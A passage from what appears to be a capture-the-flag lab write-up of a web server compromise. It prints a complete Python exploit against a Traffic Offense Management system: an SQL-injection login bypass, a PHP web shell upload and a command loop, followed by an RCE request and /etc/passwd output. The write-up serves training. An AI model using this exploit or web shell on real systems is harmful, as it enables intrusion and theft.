+<span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">https</span><span class="o">://</span><span class="n">nmap.org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="n">.</span>
+<span class="n">Nmap</span><span class="w"> </span><span class="n">done</span><span class="o">:</span><span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="nf">address </span><span class="p">(</span><span class="m">1</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="n">up</span><span class="p">)</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="m">51.45</span><span class="w"> </span><span class="n">seconds</span>
+</code></pre></div></td></tr></table></div></li>
+</ul>
+<h2 id="enumeration"><b>Enumeration</b><a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
+<p>In order to gain access to the system, I began by opening port 80 and was greeted with the Apache default page. </p>
+<p><img id="image1" /></p>
+<p>My next step was to try and enumerate hidden folders through the use of <strong><code>dirsearch.py</code></strong>. This led me to discover that the <strong>/admin</strong>, <strong>/shadow</strong>, and <strong>/passwd</strong> directories were available. However, this was a trap which I unfortunately fell for.</p>
+<p>Afterwards, I attempted to use <strong><code>enum4linux</code></strong> to enumerate the so-called <strong>"SMB"</strong> protocol at port 445. It wasn't until later that I realized another http server was running on that port, which again was a trap that I fell for.</p>
+<p>My next attempt involved enumerating hidden folders on <strong>10.10.72.232:445</strong>, which led me to discover the <strong><code>/management/</code></strong> folder that hosted a Traffic Offense Management system. </p>
+<p><img id="image2" /></p>
+<p>After conducting some online research, I found an exploit that could be allowed for Remote Code Execution (RCE). Also, I located the exploit code at searchsploit</p>
+<p><img id="image3" /></p>
+<h2 id="initial-access"><b>Initial Access</b><a class="headerlink" href="#initial-access" title="Permanent link">&para;</a></h2>
+<p>I successfully uploaded a shell to the <strong>/uploads</strong> folder using the following code.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span>
+<span class="normal">52</span>
+<span class="normal">53</span>
+<span class="normal">54</span>
+<span class="normal">55</span>
+<span class="normal">56</span>
+<span class="normal">57</span>
+<span class="normal">58</span>
+<span class="normal">59</span>
+<span class="normal">60</span>
+<span class="normal">61</span>
+<span class="normal">62</span>
+<span class="normal">63</span>
+<span class="normal">64</span>
+<span class="normal">65</span>
+<span class="normal">66</span>
+<span class="normal">67</span>
+<span class="normal">68</span>
+<span class="normal">69</span>
+<span class="normal">70</span>
+<span class="normal">71</span>
+<span class="normal">72</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="ch">#!/usr/bin/env python2</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+
+<span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Example: http://example.com</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="n">raw_input</span><span class="p">(</span><span class="s2">&quot;Url: &quot;</span><span class="p">)</span>
+<span class="n">payload_name</span> <span class="o">=</span> <span class="s2">&quot;evil.php&quot;</span>
+<span class="n">payload_file</span> <span class="o">=</span> <span class="s2">&quot;&lt;?php if(isset($_GET[&#39;cmd&#39;])){ echo &#39;&lt;pre&gt;&#39;; $cmd = ($_GET[&#39;cmd&#39;]); system($cmd); echo &#39;&lt;/pre&gt;&#39;; die; } ?&gt;&quot;</span>
+
+<span class="k">if</span> <span class="n">url</span><span class="o">.</span><span class="n">startswith</span><span class="p">((</span><span class="s1">&#39;http://&#39;</span><span class="p">,</span> <span class="s1">&#39;https://&#39;</span><span class="p">)):</span>
+    <span class="nb">print</span> <span class="s2">&quot;Check Url ...</span><span class="se">\n</span><span class="s2">&quot;</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[?] Check Adress</span><span class="se">\n</span><span class="s2">&quot;</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://&quot;</span> <span class="o">+</span> <span class="n">url</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+<span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">ConnectionError</span> <span class="k">as</span> <span class="n">exception</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] Address not reachable&quot;</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+
+<span class="n">request_url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s2">&quot;/classes/Login.php?f=login&quot;</span>
+<span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="s2">&quot;&#39;&#39; OR 1=1-- &#39;&quot;</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="s2">&quot;&#39;&#39; OR 1=1-- &#39;&quot;</span><span class="p">}</span>
+<span class="n">bypass_user</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">request_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">bypass_user</span><span class="o">.</span><span class="n">text</span> <span class="o">==</span> <span class="s1">&#39;{&quot;status&quot;:&quot;success&quot;}&#39;</span><span class="p">:</span>
+    <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;[+] Bypass Login</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">cookies</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get_dict</span><span class="p">()</span>
+    <span class="n">req</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&quot;/admin/?page=user&quot;</span><span class="p">)</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>
+    <span class="n">userid</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span><span class="s1">&#39;id&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;value&quot;</span><span class="p">)</span>
+    <span class="n">firstname</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span><span class="s1">&#39;firstname&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;value&quot;</span><span class="p">)</span>
+    <span class="n">lastname</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span><span class="s1">&#39;lastname&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;value&quot;</span><span class="p">)</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span><span class="s1">&#39;username&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;value&quot;</span><span class="p">)</span>
+
+    <span class="n">request_url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s2">&quot;/classes/Users.php?f=save&quot;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;sec-ch-ua&quot;</span><span class="p">:</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">;Not A Brand</span><span class="se">\&quot;</span><span class="s2">;v=</span><span class="se">\&quot;</span><span class="s2">99</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">Chromium</span><span class="se">\&quot;</span><span class="s2">;v=</span><span class="se">\&quot;</span><span class="s2">88</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;Accept&quot;</span><span class="p">:</span> <span class="s2">&quot;*/*&quot;</span><span class="p">,</span> <span class="s2">&quot;X-Requested-With&quot;</span><span class="p">:</span> <span class="s2">&quot;XMLHttpRequest&quot;</span><span class="p">,</span> <span class="s2">&quot;sec-ch-ua-mobile&quot;</span><span class="p">:</span> <span class="s2">&quot;?0&quot;</span><span class="p">,</span> <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36&quot;</span><span class="p">,</span> <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;multipart/form-data; boundary=----WebKitFormBoundaryxGKa5dhQCRwOodsq&quot;</span><span class="p">,</span> <span class="s2">&quot;Sec-Fetch-Site&quot;</span><span class="p">:</span> <span class="s2">&quot;same-origin&quot;</span><span class="p">,</span> <span class="s2">&quot;Sec-Fetch-Mode&quot;</span><span class="p">:</span> <span class="s2">&quot;cors&quot;</span><span class="p">,</span> <span class="s2">&quot;Sec-Fetch-Dest&quot;</span><span class="p">:</span> <span class="s2">&quot;empty&quot;</span><span class="p">,</span> <span class="s2">&quot;Accept-Encoding&quot;</span><span class="p">:</span> <span class="s2">&quot;gzip, deflate&quot;</span><span class="p">,</span> <span class="s2">&quot;Accept-Language&quot;</span><span class="p">:</span> <span class="s2">&quot;en-US,en;q=0.9&quot;</span><span class="p">,</span> <span class="s2">&quot;Connection&quot;</span><span class="p">:</span> <span class="s2">&quot;close&quot;</span><span class="p">}</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="s2">&quot;------WebKitFormBoundaryxGKa5dhQCRwOodsq</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\&quot;</span><span class="s2">id</span><span class="se">\&quot;\r\n\r\n</span><span class="s2">&quot;</span><span class="o">+</span> <span class="n">userid</span> <span class="o">+</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">------WebKitFormBoundaryxGKa5dhQCRwOodsq</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\&quot;</span><span class="s2">firstname</span><span class="se">\&quot;\r\n\r\n</span><span class="s2">&quot;</span><span class="o">+</span> <span class="n">firstname</span> <span class="o">+</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">------WebKitFormBoundaryxGKa5dhQCRwOodsq</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\&quot;</span><span class="s2">lastname</span><span class="se">\&quot;\r\n\r\n</span><span class="s2">&quot;</span><span class="o">+</span> <span class="n">lastname</span> <span class="o">+</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">------WebKitFormBoundaryxGKa5dhQCRwOodsq</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\&quot;</span><span class="s2">username</span><span class="se">\&quot;\r\n\r\n</span><span class="s2">&quot;</span><span class="o">+</span> <span class="n">username</span> <span class="o">+</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">------WebKitFormBoundaryxGKa5dhQCRwOodsq</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\&quot;</span><span class="s2">password</span><span class="se">\&quot;\r\n\r\n\r\n</span><span class="s2">------WebKitFormBoundaryxGKa5dhQCRwOodsq</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\&quot;</span><span class="s2">img</span><span class="se">\&quot;</span><span class="s2">; filename=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">+</span> <span class="n">payload_name</span> <span class="o">+</span><span class="s2">&quot;</span><span class="se">\&quot;\r\n</span><span class="s2">Content-Type: application/x-php</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">payload_file</span> <span class="o">+</span><span class="s2">&quot;</span><span class="se">\n\r\n</span><span class="s2">------WebKitFormBoundaryxGKa5dhQCRwOodsq--</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+    <span class="n">upload</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">request_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">upload</span><span class="o">.</span><span class="n">text</span> <span class="o">==</span> <span class="s2">&quot;1&quot;</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;[+] Upload Shell</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+        <span class="n">req</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&quot;/admin/?page=user&quot;</span><span class="p">)</span>
+        <span class="n">parser</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>
+        <span class="n">find_shell</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;img&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span><span class="s1">&#39;cimg&#39;</span><span class="p">})</span>
+        <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;[+] Exploit Done!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+
+        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+            <span class="n">cmd</span> <span class="o">=</span> <span class="n">raw_input</span><span class="p">(</span><span class="s2">&quot;$ &quot;</span><span class="p">)</span>
+            <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36&#39;</span><span class="p">}</span>
+            <span class="n">request</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">find_shell</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;src&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;?cmd=&quot;</span> <span class="o">+</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;key&#39;</span><span class="p">:</span><span class="s1">&#39;value&#39;</span><span class="p">},</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+            <span class="nb">print</span> <span class="n">request</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;&lt;pre&gt;&quot;</span> <span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
+            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">elif</span> <span class="n">upload</span><span class="o">.</span><span class="n">text</span> <span class="o">==</span> <span class="s2">&quot;2&quot;</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;[-] Try the manual method&quot;</span><span class="p">)</span>
+        <span class="n">request_url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s2">&quot;/classes/Login.php?f=logout&quot;</span>
+        <span class="n">cookies</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get_dict</span><span class="p">()</span>
+        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;sec-ch-ua&quot;</span><span class="p">:</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">;Not A Brand</span><span class="se">\&quot;</span><span class="s2">;v=</span><span class="se">\&quot;</span><span class="s2">99</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">Chromium</span><span class="se">\&quot;</span><span class="s2">;v=</span><span class="se">\&quot;</span><span class="s2">88</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;sec-ch-ua-mobile&quot;</span><span class="p">:</span> <span class="s2">&quot;?0&quot;</span><span class="p">,</span> <span class="s2">&quot;Upgrade-Insecure-Requests&quot;</span><span class="p">:</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span> <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36&quot;</span><span class="p">,</span> <span class="s2">&quot;Accept&quot;</span><span class="p">:</span> <span class="s2">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span><span class="p">,</span> <span class="s2">&quot;Sec-Fetch-Site&quot;</span><span class="p">:</span> <span class="s2">&quot;same-origin&quot;</span><span class="p">,</span> <span class="s2">&quot;Sec-Fetch-Mode&quot;</span><span class="p">:</span> <span class="s2">&quot;navigate&quot;</span><span class="p">,</span> <span class="s2">&quot;Sec-Fetch-User&quot;</span><span class="p">:</span> <span class="s2">&quot;?1&quot;</span><span class="p">,</span> <span class="s2">&quot;Sec-Fetch-Dest&quot;</span><span class="p">:</span> <span class="s2">&quot;document&quot;</span><span class="p">,</span> <span class="s2">&quot;Accept-Encoding&quot;</span><span class="p">:</span> <span class="s2">&quot;gzip, deflate&quot;</span><span class="p">,</span> <span class="s2">&quot;Accept-Language&quot;</span><span class="p">:</span> <span class="s2">&quot;en-US,en;q=0.9&quot;</span><span class="p">,</span> <span class="s2">&quot;Connection&quot;</span><span class="p">:</span> <span class="s2">&quot;close&quot;</span><span class="p">}</span>
+        <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">request_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[!]An unknown error&quot;</span><span class="p">)</span>
+
+<span class="k">else</span><span class="p">:</span>
+    <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;[-] Failed to bypass login panel&quot;</span><span class="p">)</span>
+</code></pre></div></td></tr></table></div>
+<p>There were some glitch on the code, but the upload was successful. I quickly checked the browser and I could see</p>
+<p><img id="image4" /></p>
+<p>I proceeded to execute commands via <strong>cmd</strong> argument in order to retrieve the <strong>/etc/passwd</strong> content. </p>
+<div class="admonition bug">
+<p class="admonition-title">RCE</p>
+<div class="highlight"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/management/uploads/1677425460_evil.php?cmd=/etc/passwd</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</code></pre></div>
+</div>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">root</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">0</span><span class="o">:</span><span class="m">0</span><span class="o">:</span><span class="n">root</span><span class="o">:/</span><span class="n">root</span><span class="o">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="n">daemon</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">1</span><span class="o">:</span><span class="m">1</span><span class="o">:</span><span class="n">daemon</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">bin</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">2</span><span class="o">:</span><span class="m">2</span><span class="o">:</span><span class="n">bin</span><span class="o">:/</span><span class="n">bin</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">sys</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">3</span><span class="o">:</span><span class="m">3</span><span class="o">:</span><span class="n">sys</span><span class="o">:/</span><span class="n">dev</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">sync</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">4</span><span class="o">:</span><span class="m">65534</span><span class="o">:</span><span class="n">sync</span><span class="o">:/</span><span class="n">bin</span><span class="o">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">sync</span>
+<span class="n">games</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">5</span><span class="o">:</span><span class="m">60</span><span class="o">:</span><span class="n">games</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">man</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">6</span><span class="o">:</span><span class="m">12</span><span class="o">:</span><span class="n">man</span><span class="o">:/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">lp</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">7</span><span class="o">:</span><span class="m">7</span><span class="o">:</span><span class="n">lp</span><span class="o">:/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">mail</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">8</span><span class="o">:</span><span class="m">8</span><span class="o">:</span><span class="n">mail</span><span class="o">:/</span><span class="n">var</span><span class="o">/</span><span class="n">mail</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">news</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">9</span><span class="o">:</span><span class="m">9</span><span class="o">:</span><span class="n">news</span><span class="o">:/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">uucp</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">10</span><span class="o">:</span><span class="m">10</span><span class="o">:</span><span class="n">uucp</span><span class="o">:/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">proxy</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">13</span><span class="o">:</span><span class="m">13</span><span class="o">:</span><span class="n">proxy</span><span class="o">:/</span><span class="n">bin</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">33</span><span class="o">:</span><span class="m">33</span><span class="o">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">:/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">backup</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">34</span><span class="o">:</span><span class="m">34</span><span class="o">:</span><span class="n">backup</span><span class="o">:/</span><span class="n">var</span><span class="o">/</span><span class="n">backups</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">list</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">38</span><span class="o">:</span><span class="m">38</span><span class="o">:</span><span class="n">Mailing</span><span class="w"> </span><span class="n">List</span><span class="w"> </span><span class="n">Manager</span><span class="o">:/</span><span class="n">var</span><span class="o">/</span><span class="n">list</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">irc</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="m">39</span><span class="o">:</span><span class="m">39</span><span class="o">:</span><span class="n">ircd</span><span class="o">:/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
